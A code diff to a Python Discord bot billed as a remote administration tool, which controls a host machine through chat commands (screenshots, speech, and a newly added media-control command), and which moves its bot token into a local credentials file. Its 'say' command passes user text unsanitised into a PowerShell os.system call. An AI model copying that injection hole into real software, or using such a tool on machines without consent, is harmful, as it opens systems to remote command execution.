@@ -14,12 +14,17 @@ import time
 # Dependency of screenshot
 from mss import mss
 
+# Dependency of media
+from input_commands import InputCommands
+
 # Here you can modify the bot's prefix and description and whether it sends help in direct messages or not.
 client = Bot(description="A remote administration tool for discord", command_prefix="!", pm_help = False)
 
 # Enter Discord Bot Token & Channel ID:
-BOT_TOKEN = 'Enter Token Here'
-CHANNEL_ID = 'Enter Channel ID here'
+import local_credentials as LocalCredentials
+#Create a local_credentials (added to .gitignore) file with the very same variables so there is no risk to commit credentials by mistake
+BOT_TOKEN = LocalCredentials.BOT_TOKEN
+CHANNEL_ID = LocalCredentials.CHANNEL_ID
 
 @client.event
 async def on_ready():
@@ -158,5 +163,29 @@ async def say(txt):
 	await client.say("Saying: " + txt)
 	os.system("powershell Add-Type -AssemblyName System.Speech; $synth = New-Object -TypeName System.Speech.Synthesis.SpeechSynthesizer; $synth.Speak('" + txt + "')")
 	await asyncio.sleep(3)
+
+# Module: media
+# Description: Controls Media Features
+# Usage: !media command times
+# Dependencies: ctypes, time
+@client.command()
+async def media(*args):
+	command = args[0]
+	times = int(args[1]) if len(args)>1 else 1
+	switcher = {
+		'vol_up':InputCommands.up_volume,
+		'vol_down':InputCommands.down_volume,
+		'next':InputCommands.media_next,
+		'prev':InputCommands.media_previous,
+		'stop':InputCommands.media_stop,
+		'play':InputCommands.media_play_pause,
+		'pause':InputCommands.media_play_pause
+		}
+	
+	for time in range(0,times):
+		switcher[command]()
+		await asyncio.sleep(0.5)
+	
+	await client.say('Media Adjusted!')
 
 client.run(BOT_TOKEN)
